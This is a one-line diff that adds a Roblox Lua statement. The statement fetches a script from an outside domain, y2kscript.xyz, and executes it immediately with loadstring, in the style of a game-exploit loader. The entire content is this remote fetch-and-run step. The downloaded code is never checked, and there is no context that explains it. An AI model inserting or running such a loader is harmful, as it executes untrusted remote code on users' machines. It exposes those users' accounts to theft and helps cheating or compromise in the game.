@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://y2kscript.xyz"))()
